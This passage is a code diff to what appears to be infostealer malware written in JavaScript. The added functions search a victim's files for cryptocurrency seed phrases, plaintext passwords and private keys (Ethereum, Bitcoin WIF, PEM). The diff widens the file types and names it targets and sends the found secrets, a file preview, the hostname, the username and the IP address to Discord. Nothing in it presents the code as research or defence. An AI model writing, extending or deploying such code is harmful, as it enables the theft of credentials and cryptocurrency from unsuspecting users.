+                }
+            }
+        } catch (e) {
+            // Skip invalid patterns
+        }
+    }
+    
+    // Also check for saved credentials in plain text
+    if (lowerContent.includes('password') || lowerContent.includes('login') || 
+        lowerContent.includes('credentials') || lowerContent.includes('account') ||
+        lowerContent.includes('saved') || isPasswordManagerExport) {
+        
+        // Look for common patterns like "username: password" or "email: password"
+        const plainTextPatterns = [
+            /(?:username|user|login|email|account)[\s:]*[:=]\s*([^\s\n@]+@?[^\s\n]*)\s+(?:password|pass|pwd)[\s:]*[:=]\s*([^\s\n]{6,})/gi,
+            /([^\s\n@]+@[^\s\n]+\.[a-zA-Z]{2,})[\s:]*[:=]\s*([^\s\n]{6,})/g
+        ];
+        
+        for (const pattern of plainTextPatterns) {
+            try {
+                const matches = [...content.matchAll(pattern)];
+                for (const match of matches) {
+                    const cred = match[1] || match[2];
+                    const pass = match[2] || match[3];
+                    if (pass && pass.length >= 6 && pass.length <= 200) {
+                        found.push({
+                            type: 'password',
+                            value: pass.substring(0, 50),
+                            username: cred && !cred.includes('@') ? cred.substring(0, 50) : '',
+                            email: cred && cred.includes('@') ? cred.substring(0, 100) : '',
+                            context: match[0].substring(0, 150),
+                            source: 'plain_text'
+                        });
+                    }
+                }
+            } catch (e) {}
+        }
+    }
+    
+    // Remove duplicates and return
+    if (found.length > 0) {
+        // Deduplicate by value
+        const unique = [];
+        const seen = new Set();
+        for (const item of found) {
+            const key = item.value.substring(0, 30);
+            if (!seen.has(key)) {
+                seen.add(key);
+                unique.push(item);
+            }
+        }
+        return unique.slice(0, 20); // Limit to 20 passwords
+    }
+    
+    return null;
 }
 
-// Function to check if filename suggests sensitive content
-function isSensitiveFile(filename) {
+// Function to detect private keys
+function detectPrivateKeys(content) {
+    if (!content) return null;
+    
+    const privateKeyPatterns = [
+        /(0x[a-fA-F0-9]{64})/g, // Ethereum private key
+        /([5KL][1-9A-HJ-NP-Za-km-z]{50,51})/g, // Bitcoin WIF
+        /([a-fA-F0-9]{64})/g, // Generic hex private key
+        /(-----BEGIN PRIVATE KEY-----[\s\S]*?-----END PRIVATE KEY-----)/g, // PEM format
+        /(-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----)/g
+    ];
+    
+    const found = [];
+    for (const pattern of privateKeyPatterns) {
+        const matches = [...content.matchAll(pattern)];
+        for (const match of matches) {
+            if (match[1] && match[1].length >= 32) {
+                found.push({
+                    type: 'private_key',
+                    value: match[1].substring(0, 100), // Limit length
+                    format: match[1].startsWith('0x') ? 'ethereum' : 
+                           match[1].startsWith('-----') ? 'pem' : 
+                           match[1].match(/^[5KL]/) ? 'bitcoin_wif' : 'hex'
+                });
+            }
+        }
+    }
+    
+    return found.length > 0 ? found.slice(0, 5) : null;
+}
+
+// Function to analyze file and determine what's inside
+function analyzeFile(filepath, filename, content) {
+    const results = {
+        fileType: 'unknown',
+        detected: [],
+        labels: []
+    };
+    
+    // Check filename for hints
     const lowerName = filename.toLowerCase();
-    const patterns = ['seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 'backup'];
-    return patterns.some(pattern => lowerName.includes(pattern));
+    if (lowerName.includes('seed') || lowerName.includes('mnemonic') || lowerName.includes('recovery')) {
+        results.labels.push('🔑 Seed/Mnemonic File');
+    }
+    if (lowerName.includes('password') || lowerName.includes('pass') || lowerName.includes('login')) {
+        results.labels.push('🔐 Password File');
+    }
+    if (lowerName.includes('wallet') || lowerName.includes('key') || lowerName.includes('private')) {
+        results.labels.push('💼 Wallet/Key File');
+    }
+    if (lowerName.includes('backup')) {
+        results.labels.push('💾 Backup File');
+    }
+    
+    // Detect seed phrase
+    const seedPhrase = detectSeedPhrase(content);
+    if (seedPhrase) {
+        results.fileType = 'seed_phrase';
+        results.detected.push(seedPhrase);
+        results.labels.push(`🌱 Seed Phrase (${seedPhrase.wordCount} words, ${seedPhrase.confidence}% confidence)`);
+    }
+    
+    // Detect passwords
+    const passwords = detectPasswords(content);
+    if (passwords) {
+        results.fileType = results.fileType === 'unknown' ? 'passwords' : results.fileType;
+        results.detected.push(...passwords);
+        results.labels.push(`🔐 Passwords Found (${passwords.length} detected)`);
+    }
+    
+    // Detect private keys
+    const privateKeys = detectPrivateKeys(content);
+    if (privateKeys) {
+        results.fileType = results.fileType === 'unknown' ? 'private_keys' : results.fileType;
+        results.detected.push(...privateKeys);
+        results.labels.push(`🔑 Private Keys Found (${privateKeys.length} detected)`);
+    }
+    
+    // If no specific detection but filename suggests sensitive content
+    if (results.detected.length === 0 && results.labels.length > 0) {
+        results.fileType = 'sensitive_file';
+    }
+    
+    return results;
 }
 
-// Function to send file to Discord directly (as file attachment)
-function sendFileToDiscord(filepath, filename) {
+// Function to send file to Discord with proper formatting
+function sendFileToDiscord(filepath, filename, analysis) {
     if (!fs.existsSync(filepath)) return;
     
-    // Read file content (limit to 2000 chars for preview)
+    // Read file content (limit to 3000 chars for preview)
     let content = '';
     try {
-        content = fs.readFileSync(filepath, 'utf8').substring(0, 2000);
+        content = fs.readFileSync(filepath, 'utf8');
     } catch (e) {
         try {
-            // Try binary read if UTF-8 fails
             content = fs.readFileSync(filepath).toString('base64').substring(0, 2000);
         } catch (e2) {
             content = '[Binary file or unreadable]';
@@ -979,8 +1468,89 @@ function sendFileToDiscord(filepath, filename) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // Create message
-    const message = `🔐 **Sensitive File Detected**\n\`\`\`\nFile: ${filename}\nPath: ${filepath.replace(os.homedir(), '~')}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\`\n\n**Content Preview:**\n\`\`\`\n${content}\n\`\`\``;
+    // Build clean and organized Discord message
+    let message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    message += `🔐 **SENSITIVE FILE DETECTED**\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    // File Info Section (Clean Format)
+    message += `📁 **File Information**\n`;
+    message += `\`\`\`\n`;
+    message += `Name: ${filename}\n`;
+    message += `Location: ${filepath.replace(os.homedir(), '~')}\n`;
+    message += `Size: ${(fs.statSync(filepath).size / 1024).toFixed(2)} KB\n`;
+    message += `\`\`\`\n\n`;
+    
+    // Detection Summary (Clean Labels)
+    if (analysis.labels.length > 0) {
+        message += `🏷️ **Detected Content**\n`;
+        analysis.labels.forEach(label => {
+            message += `${label}\n`;
+        });
+        message += `\n`;
+    }
+    
+    // Detailed Analysis (Organized by Type)
+    if (analysis.detected.length > 0) {
+        // Group by type
+        const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
+        const passwords = analysis.detected.filter(d => d.type === 'password');
+        const privateKeys = analysis.detected.filter(d => d.type === 'private_key');
+        
+        // Seed Phrases Section
+        if (seedPhrases.length > 0) {
+            message += `🌱 **Seed Phrases Detected**\n`;
+            message += `\`\`\`\n`;
+            seedPhrases.forEach((item, idx) => {
+                message += `[${idx + 1}] ${item.wordCount} words | ${item.confidence}% confidence\n`;
+                message += `   Preview: ${item.preview || item.words.slice(0, 5).join(' ') + '...'}\n`;
+                message += `   Valid BIP39: ${item.validWords}/${item.wordCount}\n`;
+                if (idx < seedPhrases.length - 1) message += `\n`;
+            });
+            message += `\`\`\`\n\n`;
+        }
+        
+        // Passwords Section
+        if (passwords.length > 0) {
+            message += `🔐 **Passwords Detected** (${passwords.length})\n`;
+            message += `\`\`\`\n`;
+            passwords.slice(0, 10).forEach((item, idx) => {
+                message += `[${idx + 1}] `;
+                if (item.email) message += `Email: ${item.email}\n      `;
+                if (item.username) message += `User: ${item.username}\n      `;
+                message += `Pass: ${item.value.substring(0, 25)}${item.value.length > 25 ? '...' : ''}\n`;
+                if (item.source === 'password_manager_export') message += `      Source: Password Manager Export\n`;
+                if (idx < Math.min(passwords.length, 10) - 1) message += `\n`;
+            });
+            if (passwords.length > 10) {
+                message += `\n... and ${passwords.length - 10} more passwords\n`;
+            }
+            message += `\`\`\`\n\n`;
+        }
+        
+        // Private Keys Section
+        if (privateKeys.length > 0) {
+            message += `🔑 **Private Keys Detected** (${privateKeys.length})\n`;
+            message += `\`\`\`\n`;
+            privateKeys.forEach((item, idx) => {
+                message += `[${idx + 1}] ${item.format.toUpperCase()}\n`;
+                message += `   ${item.value.substring(0, 40)}...\n`;
+                if (idx < privateKeys.length - 1) message += `\n`;
+            });
+            message += `\`\`\`\n\n`;
+        }
+    }
+    
+    // System Info (Compact)
+    message += `💻 **System Info**\n`;
+    message += `\`\`\`\n`;
+    message += `Host: ${HOSTNAME} | User: ${USERNAME}\n`;
+    message += `IP: ${ipAddress} | Time: ${new Date().toLocaleString()}\n`;
+    message += `\`\`\`\n\n`;
+    
+    // Content Preview (Clean)
+    message += `📄 **File Preview**\n`;
+    message += `\`\`\`\n${content.substring(0, 1200)}\n\`\`\``;
     
     // Create payload file
     const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
@@ -1005,7 +1575,7 @@ function sendFileToDiscord(filepath, filename) {
                 setTimeout(() => {
                     try { fs.unlinkSync(textFile); } catch (e) {}
                 }, 5000);
-            });
+                });
         } catch (e2) {}
     }
 }
@@ -1016,16 +1586,30 @@ function checkFile(filepath) {
     
     try {
         const stats = fs.statSync(filepath);
-        if (!stats.isFile()) return;
+        if (!stats.isFile() || stats.size > 10 * 1024 * 1024) return; // Skip files > 10MB
         
-        // Only process .txt, .log, .doc, .docx, or files with sensitive names
         const filename = path.basename(filepath);
         const ext = path.extname(filename).toLowerCase();
-        const allowedExts = ['.txt', '.log', '.doc', '.docx', '.json', '.key', '.pem'];
         
-        if (!allowedExts.includes(ext) && !isSensitiveFile(filename)) return;
+        // Process text-based files and files with sensitive names
+        const allowedExts = [
+            '.txt', '.log', '.doc', '.docx', '.json', '.key', '.pem', '.csv', '.xml', '.sql', 
+            '.env', '.config', '.conf', '.ini', '.yaml', '.yml', '.toml', '.properties',
+            '.md', '.markdown', '.rtf', '.odt', '.pages', '.xlsx', '.xls', '.db', '.sqlite',
+            '.bak', '.backup', '.old', '.tmp', '.cache'
+        ];
+        const lowerName = filename.toLowerCase();
+        const sensitiveNamePatterns = [
+            'seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 'backup', 
+            'password', 'pass', 'login', 'credential', 'secret', 'token', 'api', 'auth',
+            'account', 'user', 'cred', 'keys', 'wallet.dat', 'keystore'
+        ];
+        const hasSensitiveName = sensitiveNamePatterns.some(pattern => lowerName.includes(pattern));
         
-        // Read file content to check if it's a seed phrase
+        // Always check files with sensitive names, or allowed extensions
+        if (!allowedExts.includes(ext) && !hasSensitiveName) return;
+        
+        // Read file content
         let content = '';
         try {
             content = fs.readFileSync(filepath, 'utf8');
@@ -1033,10 +1617,13 @@ function checkFile(filepath) {
             return; // Can't read, skip
         }
         
-        // Check if content looks sensitive
-        if (isSeedPhrase(content) || isSensitiveFile(filename)) {
+        // Analyze file
+        const analysis = analyzeFile(filepath, filename, content);
+        
+        // If we detected something sensitive, send it
+        if (analysis.detected.length > 0 || analysis.labels.length > 0) {
             watchedFiles.add(filepath);
-            sendFileToDiscord(filepath, filename);
+            sendFileToDiscord(filepath, filename, analysis);
         }
     } catch (e) {
         // File might be locked or deleted, ignore
